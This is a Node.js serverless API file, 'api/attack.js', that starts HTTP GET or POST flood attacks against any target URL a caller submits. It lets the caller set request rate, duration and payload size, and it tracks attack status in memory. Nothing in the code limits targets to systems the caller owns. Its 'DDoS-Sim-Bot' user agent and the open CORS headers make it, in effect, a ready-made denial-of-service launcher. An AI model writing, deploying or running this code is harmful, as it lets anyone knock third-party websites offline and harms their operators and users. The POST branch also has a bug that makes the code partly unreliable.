// api/attack.js
const http = require('http');
const https = require('https');
const { URL } = require('url');

// In-memory store to track active attacks (serverless instances are ephemeral, 
// so this works per-instance. For multi-instance, use Vercel KV or Redis).
const activeAttacks = new Map();

function generateRandomString(length) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function makeRequest(targetUrl, options = {}) {
  return new Promise((resolve, reject) => {
    const url = new URL(targetUrl);
    const isHttps = url.protocol === 'https:';
    const client = isHttps ? https : http;
    
    const reqOptions = {
      hostname: url.hostname,
      port: url.port || (isHttps ? 443 : 80),
      path: url.pathname + url.search,
      method: options.method || 'GET',
      headers: options.headers || {
        'User-Agent': 'DDoS-Sim-Bot/1.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5'
      },
      timeout: options.timeout || 5000
    };

    const req = client.request(reqOptions, (res) => {
      res.resume(); // Consume the response data
      res.on('end', () => {
        resolve({
          statusCode: res.statusCode,
          headers: res.headers
        });
      });
    });

    req.on('error', (err) => reject(err));
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Request timed out'));
    });

    if (options.body) {
      req.write(options.body);
    }
    req.end();
  });
}

async function launchAttack({ target, type, rate, duration, payloadSize = 1024 }) {
  const attackId = generateRandomString(8).toUpperCase();
  const startTime = Date.now();
  const endTime = startTime + (duration * 1000);
  let stats = {
    requestsSent: 0,
    errors: 0,
    bytesSent: 0
  };

  const attackInterval = 1000 / rate; // Milliseconds between requests

  // Create a "bot" that runs in the background of the serverless function
  const runAttack = async () => {
    while (Date.now() < endTime && activeAttacks.get(attackId)?.running) {
      try {
        const options = {
          method: 'GET',
          timeout: 3000
        };

        if (type === 'http_post') {
          options.method = 'POST';
          options.headers['Content-Type'] = 'application/json';
          options.body = JSON.stringify({
            payload: 'A'.repeat(payloadSize),
            sessionId: generateRandomString(32),
            timestamp: Date.now()
          });
        }

        const res = await makeRequest(target, options);
        stats.requestsSent++;
        stats.bytesSent += (options.body ? Buffer.byteLength(options.body) : 0) + 500; // Estimate overhead

        if (res.statusCode >= 400) {
          stats.errors++;
        }
      } catch (err) {
        stats.errors++;
      }

      // Rate limiting
      await new Promise(resolve => setTimeout(resolve, attackInterval));
    }
    // Mark attack as finished
    const attack = activeAttacks.get(attackId);
    if (attack) {
      attack.running = false;
      attack.finishedAt = Date.now();
    }
  };

  // Store attack metadata
  activeAttacks.set(attackId, {
    id: attackId,
    target,
    type,
    rate,
    duration,
    startTime,
    endTime,
    running: true,
    stats
  });

  // Start the attack loop in the background
  runAttack();

  return {
    success: true,
    attackId,
    message: `Attack ${attackId} started against ${target}.`,
    statsUrl: `/api/attack?id=${attackId}`
  };
}

module.exports = async (req, res) => {
  const { method, query, body } = req;

  // CORS Headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (method === 'GET') {
    // Check attack status
    const { id } = query;
    if (id) {
      const attack = activeAttacks.get(id);
      if (attack) {
        return res.json({
          success: true,
          attack
        });
      } else {
        return res.status(404).json({ success: false, message: 'Attack not found' });
      }
    } else {
      // List all active attacks
      return res.json({
        success: true,
        attacks: Array.from(activeAttacks.values())
      });
    }
  }

  if (method === 'POST') {
    // Start a new attack
    const { target, type = 'http', rate = 100, duration = 30, payloadSize = 1024 } = body;

    if (!target || !target.startsWith('http')) {
      return res.status(400).json({ success: false, message: 'Valid target URL required' });
    }

    try {
      const result = await launchAttack({ target, type, rate, duration, payloadSize });
      return res.json(result);
    } catch (err) {
      return res.status(500).json({ success: false, message: err.message });
    }
  }

  return res.status(405).json({ success: false, message: 'Method not allowed' });
};
